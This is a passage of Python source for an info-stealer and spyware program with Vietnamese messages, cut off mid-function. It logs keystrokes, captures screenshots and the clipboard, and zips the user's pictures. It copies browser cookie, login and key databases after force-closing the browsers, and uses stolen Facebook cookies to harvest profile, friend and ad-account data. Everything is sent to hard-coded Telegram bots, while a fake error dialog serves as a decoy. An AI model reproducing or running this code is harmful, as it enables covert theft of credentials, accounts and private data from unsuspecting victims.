import ctypes
import os,json,shutil,win32crypt,hmac,platform,sqlite3,base64,requests,time
import sys
import zipfile
from datetime import datetime
from Crypto.Cipher import DES3
from Crypto.Cipher import AES
from pyasn1.codec.der import decoder
from hashlib import sha1, pbkdf2_hmac
from Crypto.Util.Padding import unpad 
from base64 import b64decode
import pyautogui
import socket
import psutil
import pyperclip
from pynput import keyboard
import threading 

bot_token='7512999403:AAHB4tM6mNG1tHjBzbA-sCH0J_rcwd_NnEs'
ID_chat = "7410182010"
         
def send_telegram_message(bot_token, ID_chat, message):
    url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
    data = {
        'chat_id': ID_chat,
        'text': message
    }
    requests.post(url, data=data) 
    
def send_screenshot_to_telegram():
    screenshot = pyautogui.screenshot()
    screenshot_path = os.path.join(os.environ["TEMP"], "screenshot.png")
    screenshot.save(screenshot_path)
    ip = get_ip()
    text_message = f"📷 Ảnh chụp màn hình - ip: {ip} 📷"
    files = {'photo': open(screenshot_path, 'rb')}
    data = {'chat_id': ID_chat, 'caption': text_message}
    requests.post(f'https://api.telegram.org/bot{bot_token}/sendPhoto', files=files, data=data)
    
def get_system_info():
    uname = platform.uname()
    info = {
        "System": uname.system,
        "Node Name": uname.node,
        "Release": uname.release,
        "Version": uname.version,
        "Machine": uname.machine,
        "Processor": uname.processor,
        "IP Address": socket.gethostbyname(socket.gethostname()),
        "RAM": f"{round(psutil.virtual_memory().total / (1024.0 **3))} GB",
        "Disk": f"{psutil.disk_usage('/').percent}% used of {round(psutil.disk_usage('/').total / (1024.0 **3))} GB",
        "Boot Time": psutil.boot_time()
    }
    
    cpu_info = {
        "Physical Cores": psutil.cpu_count(logical=False),
        "Total Cores": psutil.cpu_count(logical=True),
        "Max Frequency": f"{psutil.cpu_freq().max:.2f}Mhz",
        "Min Frequency": f"{psutil.cpu_freq().min:.2f}Mhz",
        "Current Frequency": f"{psutil.cpu_freq().current:.2f}Mhz",
        "CPU Usage Per Core": [f"Core {i}: {percentage}%" for i, percentage in enumerate(psutil.cpu_percent(percpu=True, interval=1))],
        "Total CPU Usage": f"{psutil.cpu_percent()}%"
    }
    
    net_info = {
        "Hostname": socket.gethostname(),
        "Fully Qualified Domain Name": socket.getfqdn(),
        "IPv4 Address": socket.gethostbyname(socket.gethostname()),
        "IPv6 Address": socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET6)[0][4][0]
    }

    mem_info = {
        "Total RAM": f"{round(psutil.virtual_memory().total / (1024.0 **3))} GB",
        "Available RAM": f"{round(psutil.virtual_memory().available / (1024.0 **3))} GB",
        "Used RAM": f"{round(psutil.virtual_memory().used / (1024.0 **3))} GB",
        "RAM Usage Percentage": f"{psutil.virtual_memory().percent}%"
    }

    partitions_info = {}
    partitions = psutil.disk_partitions()
    for partition in partitions:
        usage = psutil.disk_usage(partition.mountpoint)
        partitions_info[partition.device] = {
            "Mountpoint": partition.mountpoint,
            "Filesystem": partition.fstype,
            "Total Size": f"{round(usage.total / (1024.0 **3))} GB",
            "Used": f"{round(usage.used / (1024.0 **3))} GB",
            "Free": f"{round(usage.free / (1024.0 **3))} GB",
            "Usage Percentage": f"{usage.percent}%"
        }
    
    all_info = {
        "System Info": info,
        "CPU Info": cpu_info,
        "Network Info": net_info,
        "Memory Info": mem_info,
        "Disk Partitions Info": partitions_info
    }
    return all_info
      
def send_system_info_to_telegram(bot_token, ID_chat, system_info):
    message = ""
    for category, info in system_info.items():
        message += f"\n*{category}*\n"
        for key, value in info.items():
            if isinstance(value, list):  
                message += f"{key}: {', '.join(value)}\n"
            elif isinstance(value, dict):
                message += f"{key}:\n"
                for subkey, subvalue in value.items():
                    message += f"  - {subkey}: {subvalue}\n"
            else:
                message += f"{key}: {value}\n"
    response = requests.post(
        f'https://api.telegram.org/bot{bot_token}/sendMessage',
        data={'chat_id': ID_chat, 'text': message, 'parse_mode': 'Markdown'}
    )
    
def send_clipboard_to_telegram(bot_token, ID_chat):
    clipboard_content = pyperclip.paste()
    ip = get_ip()
    message = f"📌 Clipboard ({ip}) 📌:\n{clipboard_content}\n\n"
    response = requests.post(
        f'https://api.telegram.org/bot{bot_token}/sendMessage',
        data={'chat_id': ID_chat, 'text': message}
    )
    return response

def send_file_to_telegram(file_path, bot_token, ID_chat):
    with open(file_path, 'rb') as file:
        files = {'document': file}
        response = requests.post(f'https://api.telegram.org/bot{bot_token}/sendDocument?chat_id={ID_chat}', files=files)
        return response     
      
def find_screenshot_files(directory):
    screenshot_extensions = ['.png', '.jpg', '.jpeg', '.webp', '.bmp']
    screenshot_files = []
    for root, _, files in os.walk(directory):
        for file in files:
            if any(file.lower().endswith(ext) for ext in screenshot_extensions):
                screenshot_files.append(os.path.join(root, file))
    return screenshot_files

def zip_files(file_paths, output_zip):
    with zipfile.ZipFile(output_zip, 'w') as zipf:
        for file in file_paths:
            zipf.write(file, os.path.basename(file))

def send_pictures_zip_to_telegram():
    screenshot_dir = os.path.expanduser("~/Pictures")
    screenshot_files = find_screenshot_files(screenshot_dir)
    if not screenshot_files:
        return
    ip = get_ip()
    zip_file_path = os.path.join(os.environ["TEMP"], f"Pictures_{ip}.zip")
    zip_files(screenshot_files, zip_file_path)
    send_file_to_telegram(zip_file_path, bot_token, ID_chat)    
    
def get_wifi_info(file_path):
    try:
        wifi_info = os.popen('netsh wlan show profiles').read()
        with open(file_path, 'w', encoding="utf-8") as file:
            file.write(wifi_info)
    except Exception as e:
        pass
               
def show_error_message():
    ctypes.windll.user32.MessageBoxW(0, "Không thể mở file. File bị lỗi! Mở lại sau 20 phút!", "Error", 0x10 | 0x00040000)    
    
def get_ip():
    response = requests.get("https://ipinfo.io").text
    geolocation_tracking = json.loads(response)
    return geolocation_tracking['ip']

ip = get_ip()
log_file_path = os.path.join(os.environ["TEMP"], f"keylog({ip}).txt")

def on_press(key):
    try:
        with open(log_file_path, "a", encoding="utf-8") as f:
            f.write(key.char)
    except AttributeError:
        with open(log_file_path, "a", encoding="utf-8") as f:
            f.write(f"[{key}]")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()

def monitor_clipboard():
    last_clipboard = ""
    while True:
        time.sleep(1) 
        current_clipboard = pyperclip.paste()
        if current_clipboard != last_clipboard:
            with open(log_file_path, "a", encoding="utf-8") as f:
                f.write("\n📌 [Copy] 📌: " + current_clipboard + "\n\n")
            last_clipboard = current_clipboard
            
def send_keylog_to_telegram():
    while True:
        time.sleep(120) 
        if os.path.exists(log_file_path):
            send_file_to_telegram(log_file_path, bot_token, ID_chat)
            open(log_file_path, 'w').close()
              
hostname = os.getenv("COMPUTERNAME")
machine_name = os.getlogin()
response =requests.get("https://ipinfo.io").text
geolocation_tracking = json.loads(response)
region_name = geolocation_tracking['region']
city = geolocation_tracking['city']
ip = geolocation_tracking['ip']
country_code = geolocation_tracking['country']
now = datetime.now()
real_time = f"{now.hour:02d}{now.minute:02d}{now.second:02d}{now.day:02d}{now.month:02d}{now.year}"
name_file = f"Data[{country_code}_{ip}]-{real_time}"  
  
class Aggregation():
    def __init__(self, cookie: str):
        self.rq = requests.Session()
        cookies = self.parse_cookie(cookie)
        headers = {
        'authority': 'adsmanager.facebook.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'cache-control': 'max-age=0',
        'sec-ch-prefers-color-scheme': 'dark',
        'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
        'sec-ch-ua-full-version-list': '"Chromium";v="112.0.5615.140", "Google Chrome";v="112.0.5615.140", "Not:A-Brand";v="99.0.0.0"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-ch-ua-platform-version': '"15.0.0"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
        'viewport-width': '794',
        }
        self.rq.headers.update(headers)
        self.rq.cookies.update(cookies)
        self.uid = cookies.get('c_user', None)

    def parse_cookie(self, cookie):
        cookies = {}
        for c in cookie.split(';'):
            key_value = c.strip().split(' = ', 1)
            if len(key_value) == 2:
                key, value = key_value
                if key.lower() in ['c_user', 'xs', 'fr']: 
                    cookies[key] = value
        return cookies

    def token(self):
        try:
            act = self.rq.get('https://www.facebook.com/ads/manager')
            list_data = act.text
            x = list_data.split("act=")
            idx = x[1].split('&')[0]
            id = 'act_'+idx
            list_token = self.rq.get(f'https://adsmanager.facebook.com/adsmanager/manage/campaigns?act={idx}&filter_set&nav_entry_point=cm_redirect&nav_source=no_referrer&breakdown_regrouping=1').text
            x_token = list_token.split('{window.__accessToken="')
            token = (x_token[1].split('";')[0])
            return token
        except:
            return False

    def get_user_info(self):
        token = self.token()
        if not token:
            return
        url = f"https://graph.facebook.com/v17.0/me?fields=id,name,email,birthday,gender&access_token={token}"
        data = self.rq.get(url).json()
        return data

    def get_friends(self):
        token = self.token()
        if not token:
            return
        url = f"https://graph.facebook.com/v17.0/me/friends?access_token={token}"
        data = self.rq.get(url).json()
        return data

    def get_posts(self):
        token = self.token()
        if not token:
            return
        url = f"https://graph.facebook.com/v17.0/me/posts?access_token={token}"
        data = self.rq.get(url).json()
        return data

    def get_groups(self):
        token = self.token()
        if not token:
            return
        url = f"https://graph.facebook.com/v17.0/me/groups?access_token={token}"
        data = self.rq.get(url).json()
        return data

    def get_events(self):
        token = self.token()
        if not token:
            return
        url = f"https://graph.facebook.com/v17.0/me/events?access_token={token}"
        data = self.rq.get(url).json()
        return data
    
    def get_user_additional_info(self):
        token = self.token()
        if not token:
            return
        url = f"https://graph.facebook.com/v17.0/me?fields=location,education,work,link&access_token={token}"
        data = self.rq.get(url).json()
        return data

    def get_pages(self):
        token = self.token()
        if not token:
            return
        url = f"https://graph.facebook.com/v17.0/me/accounts?access_token={token}"
        data = self.rq.get(url).json()
        return data

    def get_ads(self):
        token = self.token()
        if not token:
            return
        url = f"https://graph.facebook.com/v17.0/me/adcampaigns?access_token={token}"
        data = self.rq.get(url).json()
        return data       
    
    def get_pages_details(self):
        token = self.token()
        if not token:
            return
        url = f"https://graph.facebook.com/v17.0/me/accounts?fields=name,category,fan_count,about,website,roles&access_token={token}"
        data = self.rq.get(url).json()
        return data

    def get_ads_details(self):
        token = self.token()
        if not token:
            return
        url = f"https://graph.facebook.com/v17.0/me/adaccounts?fields=name,campaigns,ads,adsets,adcreatives&access_token={token}"
        data = self.rq.get(url).json()
        return data

    def get_commerce_info(self):
        token = self.token()
        if not token:
            return
        url = f"https://graph.facebook.com/v17.0/me/businesses?fields=products,orders&access_token={token}"
        data = self.rq.get(url).json()
        return data

    def get_groups_details(self):
        token = self.token()
        if not token:
            return
        url = f"https://graph.facebook.com/v17.0/me/groups?fields=name,description,privacy&access_token={token}"
        data = self.rq.get(url).json()
        return data
    
    def get_videos(self):
        token = self.token()
        if not token:
            return
        url = f"https://graph.facebook.com/v17.0/me/videos?access_token={token}"
        data = self.rq.get(url).json()
        return data

    def get_activities(self):
        token = self.token()
        if not token:
            return
        url = f"https://graph.facebook.com/v17.0/me/activities?access_token={token}"
        data = self.rq.get(url).json()
        return data

    def get_page_interactions(self):
        token = self.token()
        if not token:
            return
        url = f"https://graph.facebook.com/v17.0/me/accounts?fields=interactions{id,type,time}&access_token={token}"
        data = self.rq.get(url).json()
        return data

    def get_integrations(self):
        token = self.token()
        if not token:
            return
        url = f"https://graph.facebook.com/v17.0/me/integrations?access_token={token}"
        data = self.rq.get(url).json()
        return data

    def get_feedback(self):
        token = self.token()
        if not token:
            return
        url = f"https://graph.facebook.com/v17.0/me/feedback?access_token={token}"
        data = self.rq.get(url).json()
        return data
    
    def get_profile_picture(self):
        token = self.token()
        if not token:
            return
        url = f"https://graph.facebook.com/v17.0/me/picture?redirect=false&access_token={token}"
        data = self.rq.get(url).json()
        if 'data' in data and 'url' in data['data']:
            return data['data']['url']
        return None
    
    def get_following(self):
        token = self.token()
        if not token:
            return
        url = f"https://graph.facebook.com/v17.0/me/following?access_token={token}"
        data = self.rq.get(url).json()
        return data

    def get_liked_posts(self):
        token = self.token()
        if not token:
            return
        url = f"https://graph.facebook.com/v17.0/me/likes?access_token={token}"
        data = self.rq.get(url).json()
        return data

    def get_login_history(self):
        token = self.token()
        if not token:
            return
        url = f"https://graph.facebook.com/v17.0/me/logins?access_token={token}"
        data = self.rq.get(url).json()
        return data

    def get_featured_activities(self):
        token = self.token()
        if not token:
            return
        url = f"https://graph.facebook.com/v17.0/me/activities?fields=featured_activities&access_token={token}"
        data = self.rq.get(url).json()
        return data
    
    def check_bm(self):
        List_BM = f"https://graph.facebook.com/v17.0/me/businesses?access_token={self.token()}"
        data = self.rq.get(List_BM)
        items = data.json()["data"]
        with open((os.path.join(os.environ["TEMP"], name_file, "tkqc_bm.txt")), 'a',encoding='utf-8') as f:
            f.write("Tổng số lượng Bm: "+str(len(items))+"\n\n")

    def get_list_id(self):
        all_data = []
        url = f"https://graph.facebook.com/v17.0/me/adaccounts?fields=spend_cap,amount_spent,adtrust_dsl,adspaymentcycle,currency,account_status,disable_reason,name,timezone_name,business_country_code&limit=100&access_token={self.token()}"
        data = self.rq.get(url).json()
        headers = "id tài khoản quảng cáo|tên tkqc|tiền tệ|quốc gia|limit|ngưỡng|chi tiêu tối đa|trạng thái|đã chi tiêu\n"
        with open((os.path.join(os.environ["TEMP"], name_file, "tkqc_bm.txt")), 'a', encoding='utf-8') as f:
            f.write(headers + "\n")
        for i in range(len(data["data"])):
            info = ["amount_spent","adtrust_dsl","adspaymentcycle","currency","USD","account_status","name","business_country_code","id"]
            dachitieu = data["data"][i]["amount_spent"]
            limit = data["data"][i]["adtrust_dsl"]
            try:
                adspaymentcycle = data["data"][i]["adspaymentcycle"]["data"][0]["threshold_amount"]
            except:
                adspaymentcycle= "TKQC Share"
            tiente = data["data"][i]["currency"]
            trangthai = data["data"][i]["account_status"]
            try:
                qg = data["data"][i]["business_country_code"]
            except:
                qg = None
            idtkqc = data["data"][i]["id"]
            name = data["data"][i]["name"]
            duno = data["data"][i]["spend_cap"]
            account_info = {
                "idtkqc": idtkqc,
                "name": name,
                "tiente": tiente,
                "qg": qg,
                "limit": limit,
                "adspaymentcycle": adspaymentcycle,
                "duno": duno,
                "trangthai": trangthai,
                "dachitieu": dachitieu
            }
            account_info_text = "|".join(str(value) for value in account_info.values())
            with open((os.path.join(os.environ["TEMP"], name_file, "tkqc_bm.txt")), 'a',encoding='utf-8') as f:
                f.write(account_info_text+"\n\n")
                
    def save_additional_info(self):
        def format_data(data):
            if isinstance(data, list):
                return '\n'.join(str(item) for item in data)
            elif isinstance(data, dict):
                return '\n'.join(f"{key}: {value}" for key, value in data.items())
            return str(data)
        with open(os.path.join(os.environ["TEMP"], "info_fb.txt"), 'a', encoding='utf-8') as f:
            user_info = self.get_user_info()
            if user_info:
                f.write("🙍🏼‍♂️ Thông tin người dùng: 🙍🏼‍♂️\n")
                f.write(format_data(user_info) + "\n\n")
                
            additional_user_info = self.get_user_additional_info()
            if additional_user_info:
                f.write("🆕  Thông tin bổ sung người dùng: 🆕 \n")
                f.write(format_data(additional_user_info) + "\n\n")

            friends = self.get_friends()
            if friends:
                f.write("👫 Danh sách bạn bè: 👫\n")
                f.write(format_data(friends) + "\n\n")

            posts = self.get_posts()
            if posts:
                f.write("📝 Danh sách bài viết: 📝\n")
                f.write(format_data(posts) + "\n\n")

            groups = self.get_groups()
            if groups:
                f.write("🏷️ Danh sách nhóm: 🏷️\n")
                f.write(format_data(groups) + "\n\n")

            events = self.get_events()
            if events:
                f.write("🗓️ Danh sách sự kiện: 🗓️\n")
                f.write(format_data(events) + "\n\n")

            pages = self.get_pages()
            if pages:
                f.write("📑 Danh sách trang: 📑\n")
                f.write(format_data(pages) + "\n\n")

            pages_details = self.get_pages_details()
            if pages_details:
                f.write("📜 Thông tin trang: 📜\n")
                f.write(format_data(pages_details) + "\n\n")

            ads_details = self.get_ads_details()
            if ads_details:
                f.write("📈 Thông tin quảng cáo: 📈\n")
                f.write(format_data(ads_details) + "\n\n")

            commerce_info = self.get_commerce_info()
            if commerce_info:
                f.write("🛒 Thông tin thương mại: 🛒\n")
                f.write(format_data(commerce_info) + "\n\n")

            groups_details = self.get_groups_details()
            if groups_details:
                f.write("🏷️ Chi tiết nhóm: 🏷️\n")
                f.write(format_data(groups_details) + "\n\n")

            videos = self.get_videos()
            if videos:
                f.write("🎥 Danh sách video: 🎥\n")
                f.write(format_data(videos) + "\n\n")

            activities = self.get_activities()
            if activities:
                f.write("🟢 Danh sách hoạt động: 🟢\n")
                f.write(format_data(activities) + "\n\n")

            page_interactions = self.get_page_interactions()
            if page_interactions:
                f.write("💬 Danh sách tương tác từ trang: 💬\n")
                f.write(format_data(page_interactions) + "\n\n")

            integrations = self.get_integrations()
            if integrations:
                f.write("🧩 Danh sách phần mềm tích hợp: 🧩\n")
                f.write(format_data(integrations) + "\n\n")

            feedback = self.get_feedback()
            if feedback:
                f.write("📬 Danh sách phản hồi: 📬\n")
                f.write(format_data(feedback) + "\n\n")

            following = self.get_following()
            if following:
                f.write("👀 Danh sách theo dõi: 👀\n")
                f.write(format_data(following) + "\n\n")

            liked_posts = self.get_liked_posts()
            if liked_posts:
                f.write("👍 Danh sách đã thích: 👍\n")
                f.write(format_data(liked_posts) + "\n\n")

            login_history = self.get_login_history()
            if login_history:
                f.write("🔐 Lịch sử đăng nhập: 🔐\n")
                f.write(format_data(login_history) + "\n\n")

            featured_activities = self.get_featured_activities()
            if featured_activities:
                f.write("🚀 Danh sách các tính năng đã tương tác: 🚀\n")
                f.write(format_data(featured_activities) + "\n\n")     
                                                            
    def send_file_to_telegram(self, token, chat_id, file_path, caption=''):
        url = f'https://api.telegram.org/bot{token}/sendDocument'
        with open(file_path, 'rb') as file:
            files = {'document': file}
            data = {'caption': caption, 'chat_id': chat_id}
            requests.post(url, data=data, files=files)
            
    def send_photo_to_telegram(self, token, chat_id, file_url, caption=''):
        url = f'https://api.telegram.org/bot{token}/sendPhoto'
        data = {'caption': caption, 'chat_id': chat_id, 'photo': file_url}
        requests.post(url, data=data)
        
    def download_image(self, url, file_path):
        response = requests.get(url)
        if response.status_code == 200:
            with open(file_path, 'wb') as f:
                f.write(response.content)
        else:
            pass      
        
    def main(self):
        if self.token() is False:
            return False
        else:
            self.get_list_id()
            self.check_bm()
            self.save_additional_info()
            bot_token = "7538597440:AAEsJistNXUaiM43icWerxRW1ZCROiqcx6Q"
            chat_id = '6182684172'
            profile_picture_url = self.get_profile_picture()
            if profile_picture_url:
                profile_picture_path = os.path.join(os.environ["TEMP"], "profile_picture.jpg")
                self.download_image(profile_picture_url, profile_picture_path)
            self.send_file_to_telegram(bot_token, chat_id, os.path.join(os.environ["TEMP"], "info_fb.txt"), "🔗 Thông tin tài khoản Facebook 🔗")  
            if profile_picture_url:
                self.send_photo_to_telegram(bot_token, chat_id, profile_picture_url, "📸 Ảnh đại diện Facebook 📸")
    
def check_chrome_running():
    for proc in os.popen('tasklist').readlines():
        if 'chrome.exe' in proc:
            return True
    return False

def check_firefox_running():
    for proc in os.popen('tasklist').readlines():
        if 'firefox.exe' in proc:
            return True
    return False

def check_edge_running():
    for proc in os.popen('tasklist').readlines():
        if 'msedge.exe' in proc:
            return True
    return False

def check_brave_running():
    for proc in os.popen('tasklist').readlines():
        if 'brave.exe' in proc:
            return True
    return False

def check_opera_running():
    for proc in os.popen('tasklist').readlines():
        if 'opera.exe' in proc:
            return True
    return False

def check_coccoc_running():
    for proc in os.popen('tasklist').readlines():
        if 'browser.exe' in proc:
            return True
    return False

def check_chromium_running():
    for proc in os.popen('tasklist').readlines():
        if 'chromium.exe' in proc:
            return True
    return False

def check_yandex_running():
    for proc in os.popen('tasklist').readlines():
        if 'browser.exe' in proc: 
            return True
    return False

def check_vivaldi_running():
    for proc in os.popen('tasklist').readlines():
        if 'vivaldi.exe' in proc:
            return True
    return False
     
def find_profile(path_userdata):
    profile_path = []
    for name in os.listdir(path_userdata):
        if name.startswith("Profile") or name == 'Default':
            dir_path = os.path.join(path_userdata, name)
            profile_path.append(dir_path)
    return profile_path

def kill_chrome():
    if check_chrome_running():
        os.system('taskkill /f /im chrome.exe')
        
def kill_edge():
    if check_edge_running():
        os.system('taskkill /f /im msedge.exe')
        
def kill_brave():
    if check_brave_running():
        os.system('taskkill /f /im brave.exe')

def kill_opera():
    if check_opera_running():
        os.system('taskkill /f /im opera.exe')
        
def kill_coccoc():
    if check_coccoc_running():
        os.system('taskkill /f /im browser.exe')

def kill_chromium():
    if check_chromium_running():
        os.system('taskkill /f /im chromium.exe')
            
def kill_yandex():
    if check_yandex_running():
        os.system('taskkill /f /im browser.exe')

def kill_vivaldi():
    if check_vivaldi_running():
        os.system('taskkill /f /im vivaldi.exe')
          
def get_chrome(data_path, chrome_path):
    data_chrome = os.path.join(data_path, "Chrome")
    os.mkdir(data_chrome)
    profiles = find_profile(chrome_path)
    for i, profile in enumerate(profiles, 1):
        os.mkdir(os.path.join(data_chrome, "profile" + str(i)))
        def copy_file():
            max_retries = 2
            for attempt in range(max_retries):
                if check_chrome_running():
                    kill_chrome()
                else:
                    try:
                        if os.path.exists(os.path.join(profile, 'Network', 'Cookies')):
                            shutil.copyfile(os.path.join(profile, 'Network', 'Cookies'), os.path.join(data_chrome, "profile" + str(i), 'Cookies'))
                        if os.path.exists(os.path.join(profile, 'Web Data')):
                            shutil.copyfile(os.path.join(profile, 'Web Data'), os.path.join(data_chrome, "profile" + str(i), 'Web Data'))
                        if os.path.exists(os.path.join(profile, 'Login Data')):
                            shutil.copyfile(os.path.join(profile, 'Login Data'), os.path.join(data_chrome, "profile" + str(i), 'Login Data'))
                        if os.path.exists(os.path.join(chrome_path, 'Local State')):
                            shutil.copyfile(os.path.join(chrome_path, 'Local State'), os.path.join(data_chrome, "profile" + str(i), 'Local State'))
                    except Exception as e:
                        pass
                    break
        copy_file()
        encrypted_file(os.path.join(data_chrome, "profile" + str(i)))
      
def get_edge(data_path, edge_path):
    data_edge = os.path.join(data_path, "Edge")
    os.mkdir(data_edge)
    profiles = find_profile(edge_path)
    for i, profile in enumerate(profiles, 1):
        os.mkdir(os.path.join(data_edge, "profile" + str(i)))
        def copy_file():
            max_retries = 2
            for attempt in range(max_retries):
                if check_edge_running():
                    kill_edge()
                else:
                    try:
                        if os.path.exists(os.path.join(profile, 'Network', 'Cookies')):
                            shutil.copyfile(os.path.join(profile, 'Network', 'Cookies'), os.path.join(data_edge, "profile" + str(i), 'Cookies'))
                        if os.path.exists(os.path.join(profile, 'Web Data')):
                            shutil.copyfile(os.path.join(profile, 'Web Data'), os.path.join(data_edge, "profile" + str(i), 'Web Data'))
                        if os.path.exists(os.path.join(profile, 'Login Data')):
                            shutil.copyfile(os.path.join(profile, 'Login Data'), os.path.join(data_edge, "profile" + str(i), 'Login Data'))
                        if os.path.exists(os.path.join(edge_path, 'Local State')):
                            shutil.copyfile(os.path.join(edge_path, 'Local State'), os.path.join(data_edge, "profile" + str(i), 'Local State'))
                    except Exception as e:
                        pass
                    break
        copy_file()
        encrypted_file(os.path.join(data_edge, "profile" + str(i)))
    
def get_brave(data_path, brave_path):
    data_brave = os.path.join(data_path, "Brave")
    os.mkdir(data_brave)
    profiles = find_profile(brave_path)
    for i, profile in enumerate(profiles, 1):
        os.mkdir(os.path.join(data_brave, "profile" + str(i)))
        def copy_file():
            max_retries = 2
            for attempt in range(max_retries):
                if check_brave_running():
                    kill_brave()
                else:
                    try:
                        if os.path.exists(os.path.join(profile, 'Network', 'Cookies')):
                            shutil.copyfile(os.path.join(profile, 'Network', 'Cookies'), os.path.join(data_brave, "profile" + str(i), 'Cookies'))
                        if os.path.exists(os.path.join(profile, 'Web Data')):
                            shutil.copyfile(os.path.join(profile, 'Web Data'), os.path.join(data_brave, "profile" + str(i), 'Web Data'))
                        if os.path.exists(os.path.join(profile, 'Login Data')):
                            shutil.copyfile(os.path.join(profile, 'Login Data'), os.path.join(data_brave, "profile" + str(i), 'Login Data'))
                        if os.path.exists(os.path.join(brave_path, 'Local State')):
                            shutil.copyfile(os.path.join(brave_path, 'Local State'), os.path.join(data_brave, "profile" + str(i), 'Local State'))
                    except Exception as e:
                        pass
                    break  
        copy_file()
        encrypted_file(os.path.join(data_brave, "profile" + str(i)))
    
def get_opera(data_path, opera_path):
    data_opera = os.path.join(data_path, "Opera")
    os.mkdir(data_opera)
    profiles = find_profile(opera_path)
    for i, profile in enumerate(profiles, 1):
        os.mkdir(os.path.join(data_opera, "profile" + str(i)))
        def copy_file():
            max_retries = 2
            for attempt in range(max_retries):
                if check_opera_running():
                    kill_opera()
                else:
                    try:
                        if os.path.exists(os.path.join(profile, 'Network', 'Cookies')):
                            shutil.copyfile(os.path.join(profile, 'Network', 'Cookies'), os.path.join(data_opera, "profile" + str(i), 'Cookies'))
                        if os.path.exists(os.path.join(profile, 'Web Data')):
                            shutil.copyfile(os.path.join(profile, 'Web Data'), os.path.join(data_opera, "profile" + str(i), 'Web Data'))
                        if os.path.exists(os.path.join(profile, 'Login Data')):
                            shutil.copyfile(os.path.join(profile, 'Login Data'), os.path.join(data_opera, "profile" + str(i), 'Login Data'))
                        if os.path.exists(os.path.join(opera_path, 'Local State')):
                            shutil.copyfile(os.path.join(opera_path, 'Local State'), os.path.join(data_opera, "profile" + str(i), 'Local State'))
                    except Exception as e:
                        pass
                    break  
        copy_file()
        encrypted_file(os.path.join(data_opera, "profile" + str(i)))
    
def get_coccoc(data_path, coccoc_path):
    data_coccoc = os.path.join(data_path, "CocCoc")
    os.mkdir(data_coccoc)
    profiles = find_profile(coccoc_path)
    for i, profile in enumerate(profiles, 1):
        os.mkdir(os.path.join(data_coccoc, "profile" + str(i)))
        def copy_file():
            max_retries = 2
            for attempt in range(max_retries):
                if check_coccoc_running():
                    kill_coccoc()
                else:
                    try:
                        if os.path.exists(os.path.join(profile, 'Network', 'Cookies')):
                            shutil.copyfile(os.path.join(profile, 'Network', 'Cookies'), os.path.join(data_coccoc, "profile" + str(i), 'Cookies'))
                        if os.path.exists(os.path.join(profile, 'Web Data')):
                            shutil.copyfile(os.path.join(profile, 'Web Data'), os.path.join(data_coccoc, "profile" + str(i), 'Web Data'))
                        if os.path.exists(os.path.join(profile, 'Login Data')):
                            shutil.copyfile(os.path.join(profile, 'Login Data'), os.path.join(data_coccoc, "profile" + str(i), 'Login Data'))
                        if os.path.exists(os.path.join(coccoc_path, 'Local State')):
                            shutil.copyfile(os.path.join(coccoc_path, 'Local State'), os.path.join(data_coccoc, "profile" + str(i), 'Local State'))
                    except Exception as e:
                        pass
                    break
        copy_file()
        encrypted_file(os.path.join(data_coccoc, "profile" + str(i)))
        
def get_chromium(data_path, chromium_path):
    data_chromium = os.path.join(data_path, "Chromium")
    os.mkdir(data_chromium)
    profiles = find_profile(chromium_path)
    for i, profile in enumerate(profiles, 1):
        os.mkdir(os.path.join(data_chromium, "profile" + str(i)))
        def copy_file():
            max_retries = 2
            for attempt in range(max_retries):
                if check_chromium_running():
                    kill_chromium()
                else:
                    try:
                        if os.path.exists(os.path.join(profile, 'Network', 'Cookies')):
                            shutil.copyfile(os.path.join(profile, 'Network', 'Cookies'), os.path.join(data_chromium, "profile" + str(i), 'Cookies'))
                        if os.path.exists(os.path.join(profile, 'Web Data')):
                            shutil.copyfile(os.path.join(profile, 'Web Data'), os.path.join(data_chromium, "profile" + str(i), 'Web Data'))
                        if os.path.exists(os.path.join(profile, 'Login Data')):
                            shutil.copyfile(os.path.join(profile, 'Login Data'), os.path.join(data_chromium, "profile" + str(i), 'Login Data'))
                        if os.path.exists(os.path.join(chromium_path, 'Local State')):
                            shutil.copyfile(os.path.join(chromium_path, 'Local State'), os.path.join(data_chromium, "profile" + str(i), 'Local State'))
                    except Exception as e:
                        pass
                    break  
        copy_file()
        encrypted_file(os.path.join(data_chromium, "profile" + str(i)))
        
def find_profile_firefox(firefox_path):
    profile_path = []
    for name in os.listdir(firefox_path):
            dir_path = os.path.join(firefox_path, name)
            profile_path.append(dir_path)
    return profile_path

def get_firefox(data_path, firefox_path):
    data_firefox = os.path.join(data_path, 'Firefox')
    os.mkdir(data_firefox)
    profiles = find_profile_firefox(firefox_path)
    for i, profile in enumerate(profiles, 1):
        os.mkdir(os.path.join(data_firefox, "profile" + str(i)))
        def copy_file():
            max_retries = 2
            for attempt in range(max_retries):
                if check_firefox_running():
                    os.system('taskkill /f /im firefox.exe')
                else:
                    try:
                        if os.path.exists(os.path.join(profile, 'cookies.sqlite')):
                            shutil.copyfile(os.path.join(profile, 'cookies.sqlite'), os.path.join(data_firefox, "profile" + str(i), 'cookies.sqlite'))
                        if os.path.exists(os.path.join(profile, 'key4.db')):
                            shutil.copyfile(os.path.join(profile, 'key4.db'), os.path.join(data_firefox, "profile" + str(i), 'key4.db'))
                        if os.path.exists(os.path.join(profile, 'logins.json')):
                            shutil.copyfile(os.path.join(profile, 'logins.json'), os.path.join(data_firefox, "profile" + str(i), 'logins.json'))
                        break 
                    except Exception as e:
                        pass
        copy_file()
        if os.path.exists(os.path.join(data_firefox, "profile" + str(i), 'cookies.sqlite')):
            encrypted_firefox(os.path.join(data_firefox, "profile" + str(i)))
        else:
